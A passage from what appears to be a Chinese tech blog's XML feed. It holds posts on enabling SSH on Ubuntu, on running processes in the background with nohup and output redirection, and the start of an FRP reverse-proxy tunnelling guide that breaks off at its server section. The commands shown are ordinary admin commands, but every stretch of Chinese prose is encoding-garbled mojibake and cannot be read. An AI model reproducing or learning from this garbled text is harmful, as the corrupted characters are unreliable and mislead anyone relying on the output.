å¯†æŠ€æœ¯ï¼Œç¡®ä¿åªæœ‰æ‹¥æœ‰æ­£ç¡®å¯†é’¥çš„ç”¨æˆ·æ‰èƒ½è®¿é—®æœåŠ¡å™¨ã€‚</li><li><strong>å…¼å®¹æ€§</strong>ï¼šSSHå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è½¯ä»¶å¹¿æ³›æ”¯æŒå¤šç§æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬Linuxã€Unixã€Windowsç­‰ã€‚</li><li><strong>é…ç½®ç®¡ç†</strong>ï¼šSSHå¸¸ç”¨äºè‡ªåŠ¨åŒ–è„šæœ¬å’Œé…ç½®ç®¡ç†å·¥å…·ï¼Œå¦‚Ansibleã€Puppetç­‰ï¼Œä»¥å®‰å…¨åœ°ç®¡ç†å’Œéƒ¨ç½²æœåŠ¡å™¨é…ç½®ã€‚</li><li><strong>éš§é“å’ŒVPN</strong>ï¼šSSHå¯ä»¥ä½œä¸ºVPNçš„ä¸€ç§å½¢å¼ï¼Œåˆ›å»ºå®‰å…¨çš„ç½‘ç»œéš§é“ï¼Œå…è®¸é€šè¿‡ä¸å®‰å…¨çš„ç½‘ç»œä¼ è¾“æ•æ„Ÿæ•°æ®ã€‚</li><li><strong>ç‰ˆæœ¬</strong>ï¼šSSHåè®®æœ‰ä¸¤ä¸ªä¸»è¦ç‰ˆæœ¬ï¼ŒSSH1å’ŒSSH2ï¼Œå…¶ä¸­SSH2æ›´ä¸ºå®‰å…¨å’Œæµè¡Œï¼Œæä¾›äº†æ›´å¼ºçš„åŠ å¯†å’Œæ›´å¥½çš„æ€§èƒ½ã€‚</li></ol><p>SSHå› å…¶å®‰å…¨æ€§å’Œå¤šåŠŸèƒ½æ€§ï¼Œæˆä¸ºç½‘ç»œé€šä¿¡ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ï¼Œå°¤å…¶åœ¨éœ€è¦è¿œç¨‹ç®¡ç†å’Œæ•°æ®å®‰å…¨ä¼ è¾“çš„åœºæ™¯ä¸­ã€‚</p><p>åŒæ—¶ï¼Œå¯ç”¨  SSH å°†ä¼šå…è®¸ä½ è¿œç¨‹è¿æ¥åˆ°ä½ çš„ç³»ç»Ÿï¼Œå¹¶ä¸”æ‰§è¡Œç®¡ç†å‘˜ä»»åŠ¡ã€‚ä½ å°†èƒ½å¤Ÿé€šè¿‡ <code>scp</code>å’Œ<code>sftp</code>å®‰å…¨ä¼ è¾“æ–‡ä»¶ã€‚</p><h1 id="äºŒã€ubuntuå¯ç”¨ssh"><a href="#äºŒã€ubuntuå¯ç”¨ssh" class="headerlink" title="äºŒã€ubuntuå¯ç”¨ssh"></a>äºŒã€ubuntuå¯ç”¨ssh</h1><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ Ubuntu æœ€åˆè¢«å®‰è£…çš„æ—¶å€™ï¼Œé€šè¿‡ SSH è¿›è¡Œè¿œç¨‹è®¿é—®æ˜¯ä¸è¢«å…è®¸çš„ã€‚</p><h2 id="2-1-å®‰è£…openssh-server"><a href="#2-1-å®‰è£…openssh-server" class="headerlink" title="2.1 å®‰è£…openssh-server"></a>2.1 å®‰è£…openssh-server</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssh-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å½“è¢«æç¤ºæ—¶ï¼Œè¾“å…¥ä½ çš„å¯†ç å¹¶ä¸”æŒ‰ Enterï¼Œç»§ç»­å®‰è£…ã€‚</p><h2 id="2-2-éªŒè¯æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œ"><a href="#2-2-éªŒè¯æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œ" class="headerlink" title="2.2 éªŒè¯æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œ"></a>2.2 éªŒè¯æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œ</h2><p>ä¸€æ—¦å®‰è£…å®Œæˆï¼ŒSSH æœåŠ¡å°†ä¼šè¢«è‡ªåŠ¨å¯åŠ¨ã€‚ä½ å¯ä»¥éªŒè¯ SSH æ˜¯å¦æ­£åœ¨è¿è¡Œï¼Œè¾“å…¥ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/%E6%88%AA%E5%B1%8F2024-12-23%2014.14.20.png" style="zoom:50%;"><h2 id="2-3-sshç™»å½•"><a href="#2-3-sshç™»å½•" class="headerlink" title="2.3 sshç™»å½•"></a>2.3 sshç™»å½•</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> sxk@192.168.155.31 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç³»ç»Ÿè¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç³»ç»Ÿè¿ç»´ </tag>
            
            <tag> ubuntuçš„sshæœåŠ¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›ç¨‹åå°ç®¡ç†</title>
      <link href="/2024/12/17/xi-tong-yun-wei/jin-cheng-hou-tai-guan-li/"/>
      <url>/2024/12/17/xi-tong-yun-wei/jin-cheng-hou-tai-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€nohup"><a href="#ä¸€ã€nohup" class="headerlink" title="ä¸€ã€nohup"></a>ä¸€ã€nohup</h1><h2 id="1-1-ç®€ä»‹"><a href="#1-1-ç®€ä»‹" class="headerlink" title="1.1 ç®€ä»‹"></a>1.1 ç®€ä»‹</h2><p><code>nohup</code> æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨äºåœ¨ç”¨æˆ·æ³¨é”€åç»§ç»­è¿è¡Œå‘½ä»¤ã€‚å®ƒçš„åå­—æ¥æºäº â€œno hang upâ€ï¼ˆä¸è¦æŒ‚æ–­ï¼‰ï¼Œæ„å‘³ç€å³ä½¿ç”¨æˆ·æŒ‚æ–­ï¼ˆæ³¨é”€ï¼‰äº†ï¼Œå‘½ä»¤ä¹Ÿä¼šç»§ç»­æ‰§è¡Œã€‚</p><h2 id="1-2-ç”¨æ³•"><a href="#1-2-ç”¨æ³•" class="headerlink" title="1.2 ç”¨æ³•"></a>1.2 ç”¨æ³•</h2><p>ä»¥ä¸‹æ˜¯ <code>nohup</code> çš„ä¸€äº›å…³é”®ç‰¹æ€§å’Œç”¨æ³•ï¼š</p><ol><li><p><strong>åå°è¿è¡Œå‘½ä»¤</strong>ï¼š</p><ul><li><code>nohup</code> å…è®¸ä½ è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå³ä½¿åœ¨ç»ˆç«¯å…³é—­æˆ–ç”¨æˆ·æ³¨é”€åï¼Œè¯¥å‘½ä»¤ä¹Ÿä¼šç»§ç»­åœ¨åå°è¿è¡Œã€‚</li></ul></li><li><p><strong>å¿½ç•¥æŒ‚èµ·ä¿¡å·</strong>ï¼š</p><ul><li>é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ç»ˆç«¯ä¼šè¯ç»“æŸæ—¶ï¼Œæ‰€æœ‰çš„è¿›ç¨‹éƒ½ä¼šæ”¶åˆ° <code>SIGHUP</code>ï¼ˆæŒ‚èµ·ä¿¡å·ï¼‰ï¼Œè¿™ä¼šå¯¼è‡´å¤§å¤šæ•°ç¨‹åºç»ˆæ­¢ã€‚<code>nohup</code> å‘½ä»¤ä¼šå¿½ç•¥è¿™ä¸ªä¿¡å·ï¼Œä½¿å¾—è¿›ç¨‹å¯ä»¥ç»§ç»­è¿è¡Œã€‚</li></ul></li><li><p><strong>è¾“å‡ºé‡å®šå‘</strong>ï¼š</p><ul><li>å¦‚æœä½ ä¸æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œ<code>nohup</code> ä¼šå°†è¾“å‡ºé‡å®šå‘åˆ°åä¸º <code>nohup.out</code> çš„æ–‡ä»¶ä¸­ã€‚å¦‚æœ <code>nohup.out</code> æ–‡ä»¶å·²å­˜åœ¨ï¼Œè¾“å‡ºä¼šè¢«è¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾ã€‚</li></ul></li><li><p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>ï¼š</p><ul><li><p>è¿è¡Œä¸€ä¸ªå‘½ä»¤å¹¶å¿½ç•¥æŒ‚èµ·ä¿¡å·ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> some-command <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><ul><li><p>å°†è¾“å‡ºé‡å®šå‘åˆ°ç‰¹å®šæ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> some-command <span class="token operator">&gt;</span> output.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ol><p>â€‹        è¿™é‡Œ <code>&gt;</code> å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ° <code>output.log</code>ï¼Œ<code>2&gt;&amp;1</code> å°†æ ‡å‡†é”™è¯¯ä¹Ÿé‡å®šå‘åˆ°åŒä¸€ä¸ªæ–‡ä»¶ã€‚</p><ol start="5"><li><p><strong>é€€å‡ºä»£ç </strong>ï¼š</p><ul><li><code>nohup</code> å‘½ä»¤æœ¬èº«ä¼šè¿”å› <code>0</code>ï¼Œè¡¨ç¤ºæˆåŠŸæ‰§è¡Œã€‚å®ƒä¸ä¼šè¿”å›åå°è¿è¡Œå‘½ä»¤çš„é€€å‡ºä»£ç ã€‚</li></ul></li><li><p><strong>æŸ¥çœ‹åå°è¿›ç¨‹</strong>ï¼š</p><ul><li>ä½ å¯ä»¥ä½¿ç”¨ <code>ps</code> å‘½ä»¤æŸ¥çœ‹åå°è¿è¡Œçš„ <code>nohup</code> è¿›ç¨‹ï¼Œæˆ–è€…ä½¿ç”¨ <code>jobs</code> æŸ¥çœ‹å½“å‰ä¼šè¯çš„åå°ä½œä¸šã€‚</li></ul></li><li><p><strong>ç»“æŸåå°è¿›ç¨‹</strong>ï¼š</p><ul><li>å¦‚æœéœ€è¦ç»“æŸ <code>nohup</code> å¯åŠ¨çš„åå°è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ <code>kill</code> å‘½ä»¤åŠ ä¸Šè¿›ç¨‹çš„ PIDï¼ˆè¿›ç¨‹ç¼–å·ï¼‰ã€‚</li></ul></li></ol><h2 id="1-3-ä½¿ç”¨ç¤ºä¾‹"><a href="#1-3-ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="1.3 ä½¿ç”¨ç¤ºä¾‹"></a>1.3 ä½¿ç”¨ç¤ºä¾‹</h2><p>åœ¨ä¸€ä¸ªéœ€è¦é•¿æ—¶é—´ï¼ˆ24å°æ—¶ä»¥ä¸Šï¼‰è¿è¡Œpythonè„šæœ¬çš„åœºæ™¯ä¸­ï¼Œä¸€å¼€å§‹é€šè¿‡MobaXTermè¿æ¥è¿œç¨‹ä¸»æœºè·å–sshçš„shellï¼Œç„¶åç›´æ¥åœ¨ç»ˆç«¯è¿è¡Œ <code>/è·¯å¾„/python xxxx.py</code>ï¼Œç¬¬äºŒå¤©æŸ¥çœ‹æ—¥å¿—çš„æ—¶å€™ï¼Œè„šæœ¬è«åå…¶å¦™ç»ˆæ­¢äº†ã€‚æ€€ç–‘å¯èƒ½æ˜¯å ¡å’æœºå›æ”¶æˆ–è€…shellæ–­å¼€è¿æ¥å¯¼è‡´çš„ã€‚</p><p>ä¸ºäº†æµ‹è¯•æ˜¯å¦æ˜¯ä¸Šè¿°åŸå› ï¼Œå¹¶è§£å†³å› ä¸ºshellæ–­è¿å¯¼è‡´è„šæœ¬è¿è¡Œç»“æŸçš„é—®é¢˜ï¼Œä½¿ç”¨nohupåå°è¿è¡Œpythonä»»åŠ¡è¿›ç¨‹ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> xxxxx/python xxxxx.py <span class="token operator">&gt;</span> myTest.log <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>å‘½ä»¤è¯¦è§£ï¼š</li></ul><ol><li>**<code>nohup</code>**ï¼šè¿™æ˜¯å‘½ä»¤çš„å¼€å§‹ï¼Œè¡¨ç¤ºå¿½ç•¥æŒ‚èµ·ä¿¡å·ï¼Œå³ä½¿ç”¨æˆ·æ³¨é”€æˆ–ç»ˆç«¯å…³é—­ï¼Œå‘½ä»¤ä¹Ÿä¼šç»§ç»­è¿è¡Œã€‚</li><li>**<code>xxxxx/python</code>**ï¼šè¿™éƒ¨åˆ†åº”è¯¥æ˜¯è¦æ‰§è¡Œçš„ Python è§£é‡Šå™¨çš„è·¯å¾„ã€‚è¯·ç¡®ä¿æ›¿æ¢ <code>xxxxx</code> ä¸ºå®é™…çš„è·¯å¾„ï¼Œä¾‹å¦‚ <code>/usr/bin/python</code>ã€‚</li><li>**<code>xxxxx.py</code>**ï¼šè¿™æ˜¯è¦è¿è¡Œçš„ Python è„šæœ¬çš„è·¯å¾„ã€‚åŒæ ·ï¼Œè¯·ç¡®ä¿æ›¿æ¢ <code>xxxxx</code> ä¸ºå®é™…çš„è„šæœ¬è·¯å¾„ï¼Œä¾‹å¦‚ <code>/home/user/myscript.py</code>ã€‚</li><li>**<code>&gt;</code>**ï¼šè¿™æ˜¯ä¸€ä¸ªè¾“å‡ºé‡å®šå‘æ“ä½œç¬¦ï¼Œå®ƒä¼šå°†æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰é‡å®šå‘åˆ°åé¢æŒ‡å®šçš„æ–‡ä»¶ã€‚</li><li>**<code>myTest.log</code>**ï¼šè¿™æ˜¯å¸Œæœ›å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°çš„æ–‡ä»¶åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œ<code>nohup</code> ä¼šåˆ›å»ºå®ƒï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œè¾“å‡ºä¼šè¦†ç›–åˆ°myTest.logæ–‡ä»¶ã€‚</li><li>**<code>2&gt;&amp;1</code>**ï¼šè¿™æ˜¯ä¸€ä¸ªé”™è¯¯è¾“å‡ºé‡å®šå‘æ“ä½œç¬¦ï¼Œå®ƒå°†æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ã€‚è¿™æ„å‘³ç€é”™è¯¯ä¿¡æ¯ä¹Ÿä¼šè¢«å†™å…¥åˆ° <code>myTest.log</code> æ–‡ä»¶ä¸­ã€‚</li><li>**<code>&amp;</code>**ï¼šè¿™æ˜¯ä¸€ä¸ªåå°è¿è¡Œæ“ä½œç¬¦ï¼Œå®ƒå°†å‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œï¼Œå…è®¸æ‚¨ç»§ç»­åœ¨åŒä¸€ç»ˆç«¯è¿›è¡Œå…¶ä»–æ“ä½œã€‚</li></ol><p>ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯ï¼šä½¿ç”¨ <code>nohup</code> è¿è¡ŒæŒ‡å®šè·¯å¾„çš„ Python è§£é‡Šå™¨æ¥æ‰§è¡ŒæŒ‡å®šè·¯å¾„çš„ Python è„šæœ¬ï¼Œå¹¶å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° <code>myTest.log</code> æ–‡ä»¶ä¸­ï¼ŒåŒæ—¶è®©è¿™ä¸ªå‘½ä»¤åœ¨åå°è¿è¡Œã€‚</p><ul><li>2&gt;&amp;1è¯¦è§£ï¼š</li></ul><p><code>2&gt;&amp;1</code> æ˜¯ä¸€ä¸ªåœ¨ Unix å’Œç±» Unix ç³»ç»Ÿä¸­å¸¸ç”¨çš„ shell æ“ä½œç¬¦ï¼Œç”¨äºå°†æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º 2ï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼Œæ–‡ä»¶æè¿°ç¬¦ä¸º 1ï¼‰çš„ä½ç½®ã€‚ä¸‹é¢æ˜¯å¯¹ <code>2&gt;&amp;1</code> çš„è¯¦ç»†è§£é‡Šï¼š</p><ol><li>**<code>2</code>**ï¼šè¿™ä¸ªæ•°å­—ä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆstderrï¼‰çš„æ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨ Unix ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªæ‰“å¼€çš„æ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹å…³è”çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ ‡å‡†é”™è¯¯è¾“å‡ºé»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯ 2ã€‚</li><li>**<code>&gt;</code>**ï¼šè¿™æ˜¯ä¸€ä¸ªé‡å®šå‘æ“ä½œç¬¦ï¼Œç”¨äºå°†ç´§éšå…¶åçš„æ–‡ä»¶æè¿°ç¬¦çš„è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„ä½ç½®ã€‚</li><li><strong><code>&amp;1</code><strong>ï¼š <code>1</code> æ˜¯æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰çš„æ–‡ä»¶æè¿°ç¬¦ã€‚<code>&amp;1</code> è¡¨ç¤ºå°†å‰é¢çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆè¿™é‡Œæ˜¯æ ‡å‡†é”™è¯¯ stderrï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºçš„ä½ç½®ã€‚ã€Œè¿™é‡Œçš„</strong>&amp;<strong>æ²¡æœ‰å›ºå®šçš„æ„æ€æ”¾åœ¨</strong>&gt;<strong>åé¢çš„</strong>&amp;<strong>ï¼Œè¡¨ç¤ºé‡å®šå‘çš„ç›®æ ‡ä¸æ˜¯ä¸€ä¸ª</strong>æ–‡ä»¶</strong>ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>æ–‡ä»¶æè¿°ç¬¦</strong></li></ol><p>ç»¼åˆèµ·æ¥ï¼Œ<code>2&gt;&amp;1</code> çš„ä½œç”¨æ˜¯å°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºçš„ä½ç½®ã€‚è¿™æ„å‘³ç€ï¼ŒåŸæœ¬åº”è¯¥è¾“å‡ºåˆ° stderr çš„å†…å®¹ï¼ˆé€šå¸¸æ˜¯é”™è¯¯ä¿¡æ¯ï¼‰ç°åœ¨ä¼šå’Œ stdout çš„å†…å®¹ä¸€èµ·è¾“å‡ºã€‚</p></blockquote><p><code>nohup</code> æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦é•¿æ—¶é—´è¿è¡Œçš„å‘½ä»¤æˆ–è€…éœ€è¦åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œé•¿æ—¶é—´ä»»åŠ¡æ—¶ã€‚é€šè¿‡ä½¿ç”¨ <code>nohup</code>ï¼Œä½ å¯ä»¥ç¡®ä¿å³ä½¿åœ¨è¿œç¨‹ä¼šè¯æ–­å¼€åï¼Œä»»åŠ¡ä»ç„¶å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç³»ç»Ÿè¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç³»ç»Ÿè¿ç»´ </tag>
            
            <tag> åå°è¿›ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FRPå†…ç½‘ç©¿é€</title>
      <link href="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/"/>
      <url>/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ä»€ä¹ˆæ˜¯FRP"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯FRP" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯FRP"></a>ä¸€ã€ä»€ä¹ˆæ˜¯FRP</h1><h2 id="1-1-FRPç®€ä»‹"><a href="#1-1-FRPç®€ä»‹" class="headerlink" title="1.1 FRPç®€ä»‹"></a>1.1 FRPç®€ä»‹</h2><p>FRPï¼ˆFast Reverse Proxyï¼‰æ˜¯ä¸€ä¸ªå¼€æºã€é«˜æ€§èƒ½çš„å†…ç½‘ç©¿é€å’Œåå‘ä»£ç†åº”ç”¨ï¼Œå®ƒæ”¯æŒTCPã€UDPã€HTTPã€HTTPSç­‰å¤šç§åè®®ã€‚FRPå¯ä»¥å¸®åŠ©ç”¨æˆ·å°†å†…ç½‘æœåŠ¡ä»¥å®‰å…¨ã€ä¾¿æ·çš„æ–¹å¼é€šè¿‡å…·æœ‰å…¬ç½‘IPèŠ‚ç‚¹çš„ä¸­è½¬æš´éœ²åˆ°å…¬ç½‘ã€‚</p><p>FRPç”±å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰å’ŒæœåŠ¡ç«¯ï¼ˆfrpsï¼‰ç»„æˆï¼ŒæœåŠ¡ç«¯é€šå¸¸éƒ¨ç½²åœ¨å…·æœ‰å…¬ç½‘IPçš„æœºå™¨ä¸Šï¼Œè€Œå®¢æˆ·ç«¯éƒ¨ç½²åœ¨éœ€è¦ç©¿é€çš„å†…ç½‘æœåŠ¡æ‰€åœ¨çš„æœºå™¨ä¸Šã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒFRPå®ç°äº†å†…ç½‘æœåŠ¡çš„å…¬ç½‘è®¿é—®ï¼ŒåŒæ—¶æä¾›äº†å®‰å…¨æ€§å’Œä¾¿åˆ©æ€§ã€‚</p><p>FRPçš„ä¸€äº›åº”ç”¨åœºæ™¯ï¼š</p><ul><li><strong>è¿œç¨‹è®¿é—®å†…ç½‘æœåŠ¡</strong>ï¼šä¾‹å¦‚ï¼Œé€šè¿‡FRPè®¿é—®å®¶é‡Œæˆ–å…¬å¸çš„æœåŠ¡å™¨ï¼Œè€Œä¸éœ€è¦é…ç½®å¤æ‚çš„ç«¯å£æ˜ å°„ã€‚</li><li><strong>å¼€å‘ç¯å¢ƒå…±äº«</strong>ï¼šå¼€å‘è€…å¯ä»¥é€šè¿‡FRPå…±äº«è‡ªå·±æœ¬åœ°çš„å¼€å‘ç¯å¢ƒï¼Œå¤–éƒ¨å›¢é˜Ÿå¯ä»¥ç›´æ¥è®¿é—®å†…ç½‘çš„åº”ç”¨å’ŒAPIã€‚</li><li><strong>ç©¿é€é˜²ç«å¢™/NAT</strong>ï¼šå³ä½¿å†…ç½‘æœåŠ¡å™¨å¤„äºNATåé¢æˆ–é˜²ç«å¢™åé¢ï¼Œä»ç„¶å¯ä»¥é€šè¿‡FRPå°†æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ã€‚</li></ul><h2 id="1-2-FRPå·¥ä½œåŸç†"><a href="#1-2-FRPå·¥ä½œåŸç†" class="headerlink" title="1.2 FRPå·¥ä½œåŸç†"></a>1.2 FRPå·¥ä½œåŸç†</h2><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2010.09.24.png" style="zoom:50%;"><ul><li>æœåŠ¡ç«¯ï¼ˆfrpsï¼‰è¿è¡Œï¼Œç›‘å¬ä¸€ä¸ªä¸»ç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰çš„è¿æ¥ï¼›</li><li>å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰è¿æ¥åˆ°æœåŠ¡ç«¯ï¼ˆfrpsï¼‰çš„ä¸»ç«¯å£ï¼ŒåŒæ—¶å‘Šè¯‰æœåŠ¡ç«¯è¦ç›‘å¬çš„ç«¯å£å’Œè½¬å‘ç±»å‹ï¼›</li><li>æœåŠ¡ç«¯forkæ–°çš„è¿›ç¨‹ç›‘å¬å®¢æˆ·ç«¯æŒ‡å®šçš„ç›‘å¬ç«¯å£ï¼›</li><li>å¤–ç½‘ç”¨æˆ·è¿æ¥åˆ°ä¸Šä¸€æ­¥æœåŠ¡ç«¯forkçš„è¿›ç¨‹æ‰€ç›‘å¬çš„ç«¯å£ï¼ŒæœåŠ¡ç«¯ï¼ˆfrpsï¼‰é€šè¿‡å’Œå®¢æˆ·ç«¯ï¼ˆfrpcï¼‰çš„è¿æ¥å°†æ•°æ®è½¬å‘åˆ°å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰ï¼›</li><li>å®¢æˆ·ç«¯ï¼ˆfrpcï¼‰è¿›ç¨‹å†å°†æ•°æ®è½¬å‘åˆ°æœ¬åœ°æœåŠ¡</li><li>åç»­æµé‡ä»å†…ç½‘æœ¬åœ°æœåŠ¡è½¬å‘ç»™frpcï¼Œfrpcè½¬å‘ç»™frpsï¼Œfrpsè½¬å‘ç»™å¤–ç½‘ç”¨æˆ·ï¼Œä»è€Œå®ç°å†…ç½‘å¯¹å¤–æš´éœ²æœåŠ¡çš„èƒ½åŠ›ã€‚</li></ul><img src="/2024/12/13/nei-wang-gong-fang/frp-nei-wang-chuan-tou/%E6%88%AA%E5%B1%8F2024-12-16%2010.14.00.png" style="zoom:50%;"><blockquote><p>å›¾ä¸­ï¼Œå†…ç½‘æœ¬åœ°çš„127.0.0.1:80ç«¯å£çš„webæœåŠ¡é€šè¿‡å®¢æˆ·ç«¯é…ç½®ï¼Œæ˜ å°„åˆ°VPSä¸Šçš„47.97.177.130:30001ç«¯å£ã€‚åç»­æµé‡ä»æœ¬åœ°80ç«¯å£è½¬å‘åˆ°frpcï¼Œfrpcé€šè¿‡vpsçš„7000ç«¯å£è½¬å‘ç»™vpsï¼Œvpsåœ¨æŠŠæµé‡è½¬å‘åˆ°30001ç«¯å£ï¼Œå¦‚æ­¤ä¾¿å®ç°äº†å†…ç½‘æœåŠ¡åœ¨å¤–ç½‘çš„æš´éœ²ï¼Œå¤–ç½‘ç”¨æˆ·å¯ä»¥ä»å¤–ç½‘è®¿é—®åˆ°å†…ç½‘çš„80ç«¯å£çš„æœåŠ¡ã€‚</p></blockquote><h1 id="äºŒã€å®ç°FRPå†…ç½‘ç©¿é€çš„å‰ææ¡ä»¶"><a href="#äºŒã€å®ç°FRPå†…ç½‘ç©¿é€çš„å‰ææ¡ä»¶" class="headerlink" title="äºŒã€å®ç°FRPå†…ç½‘ç©¿é€çš„å‰ææ¡ä»¶"></a>äºŒã€å®ç°FRPå†…ç½‘ç©¿é€çš„å‰ææ¡ä»¶</h1><ol><li>VPSä¸€å°ï¼ˆä¹Ÿå¯ä»¥æ˜¯å…·æœ‰å…¬ç½‘IPçš„å®ä½“æœºï¼‰ï¼Œå› ä¸ºfrpçš„åŸç†æ˜¯åˆ©ç”¨æœåŠ¡ç«¯VPSæ¥è¿›è¡Œæµé‡è½¬å‘ï¼Œå› è€ŒVPSçš„æ€§èƒ½ç›´æ¥å†³å®šäº†åç»­è¿æ¥çš„è´¨é‡ã€‚</li><li>è®¿é—®ç›®æ ‡è®¾å¤‡ï¼ˆå°±æ˜¯ä½ æœ€ç»ˆè¦è®¿é—®çš„å†…ç½‘è®¾å¤‡ï¼‰</li><li>ç®€å•çš„Linuxå‘½ä»¤åŸºç¡€</li></ol><h1 id="ä¸‰ã€å®ç°æ–¹æ³•"><a href="#ä¸‰ã€å®ç°æ–¹æ³•" class="headerlink" title="ä¸‰ã€å®ç°æ–¹æ³•"></a>ä¸‰ã€å®ç°æ–¹æ³•</h1><h2 id="3-1-æœåŠ¡ç«¯ï¼ˆfrpsï¼‰"><a href="#3-1-æœåŠ¡ç«¯ï¼ˆfrpsï¼‰" class="headerlink" title="3.1 æœåŠ¡ç«¯ï¼ˆfrpsï¼‰"></a>3.1 